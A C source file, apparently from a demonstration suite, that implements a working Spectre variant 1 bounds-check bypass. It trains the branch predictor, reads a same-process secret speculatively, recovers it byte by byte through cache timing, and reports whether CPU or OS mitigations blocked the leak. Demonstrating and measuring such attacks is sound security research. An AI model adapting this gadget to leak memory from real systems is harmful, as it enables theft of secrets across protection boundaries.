#include "spectre.h"
#include "cache.h"
#include <stdio.h>
#include <string.h>
#include <stdint.h>
#include <x86intrin.h>

/* -----------------------------------------------------------------------
   Victim data layout
   ----------------------------------------------------------------------- */
static struct {
    uint8_t array1[16];
    uint8_t _gap[32];
    char    secret[32];
} victim_data = {
    .array1 = {1,2,3,4,5,6,7,8,9,10,11,12,13,14,15,16},
    .secret = "SPECTRE_SECRET_XYZ",
};

static volatile size_t array1_size = 16;
static uint8_t sink = 0;

/* -----------------------------------------------------------------------
   Victim function — the speculative gadget */
__attribute__((noinline))
static void victim_function(size_t x) {
    if (x < array1_size) {
        /*
         * SPECULATIVE WINDOW
         * ------------------
         * When x == (secret - array1), the CPU speculatively reads
         * victim_data.array1[x] (= a secret byte) and uses it to load
         * probe_array[secret_byte * CACHE_STRIDE] into L1.
         * Registers roll back when the bounds check retires; cache does not.
         */
        sink &= probe_array[victim_data.array1[x] * CACHE_STRIDE];
    }
}

/* -----------------------------------------------------------------------
   Attack: read one byte at (array1 + offset) speculatively */
static uint8_t spectre_read_byte(size_t malicious_offset) {
    int scores[256] = {0};

    for (int trial = 0; trial < 1000; trial++) {
        _mm_clflush((void *)&array1_size);
        flush_probe_array();
        _mm_mfence();

        /* Train: 30 in-bounds calls saturate the BHT counter to "strongly taken" */
        for (int j = 29; j >= 0; j--) {
            _mm_clflush((void *)&array1_size);
            victim_function(j % 16);
        }

        /* Malicious call — branch predicted taken, secret byte read speculatively */
        victim_function(malicious_offset);

        scores[find_cached_slot(NULL)]++;
    }

    int best = 0;
    for (int i = 1; i < 256; i++)
        if (scores[i] > scores[best]) best = i;
    return (uint8_t)best;
}

/* -----------------------------------------------------------------------
   Public entry point */
int spectre_demo(void) {
    printf("\n");
    printf("╔══════════════════════════════════════════╗\n");
    printf("║          SPECTRE  (variant 1)            ║\n");
    printf("║       Bounds-Check Bypass Attack         ║\n");
    printf("╚══════════════════════════════════════════╝\n\n");

    size_t base_offset = (size_t)(victim_data.secret - (char *)victim_data.array1);
    printf("  array1 addr  : %p\n", (void *)victim_data.array1);
    printf("  secret addr  : %p\n", (void *)victim_data.secret);
    printf("  secret offset: +%zu bytes past array1\n\n", base_offset);

    FILE *f = fopen("/sys/devices/system/cpu/vulnerabilities/spectre_v1", "r");
    if (f) {
        char status[128] = {0};
        if (fgets(status, sizeof(status), f))
            status[strcspn(status, "\n")] = 0;
        printf("  Kernel spectre_v1: %s\n\n", status);
        fclose(f);
    }

    printf("  Leaking secret...\n\n");
    printf("  Byte#  Leaked   ASCII  Expected\n");
    printf("  ─────  ──────   ─────  ────────\n");

    size_t secret_len = strlen(victim_data.secret);
    int correct = 0;

    for (size_t i = 0; i < secret_len; i++) {
        uint8_t leaked   = spectre_read_byte(base_offset + i);
        uint8_t expected = (uint8_t)victim_data.secret[i];
        char match = (leaked == expected) ? '*' : ' ';
        if (leaked == expected) correct++;
        printf("  [%2zu]   0x%02X     '%c'    0x%02X '%c'  %c\n",
               i,
               leaked,   (leaked   >= 32 && leaked   < 127) ? (char)leaked   : '?',
               expected, (expected >= 32 && expected < 127) ? (char)expected : '?',
               match);
    }

    printf("\n  Result: %d/%zu bytes correct (%.0f%%)\n",
           correct, secret_len, 100.0 * correct / secret_len);
    if (correct == (int)secret_len)   printf("  [PASS] Full secret exfiltrated.\n");
    else if (correct > 0)             printf("  [PARTIAL] Mitigations reduced accuracy.\n");
    else                              printf("  [BLOCKED] CPU/OS mitigations in effect.\n");
    return 0;
}
